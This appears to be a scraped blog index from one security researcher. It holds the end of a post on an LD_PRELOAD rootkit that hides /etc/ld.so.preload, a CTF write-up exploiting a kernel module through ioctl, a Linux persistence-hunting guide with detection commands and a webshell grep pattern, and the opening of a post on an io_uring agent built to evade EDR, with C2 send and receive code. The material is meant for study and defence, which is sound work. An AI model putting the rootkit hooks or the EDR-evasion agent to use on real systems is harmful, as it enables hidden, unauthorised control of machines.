*(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file 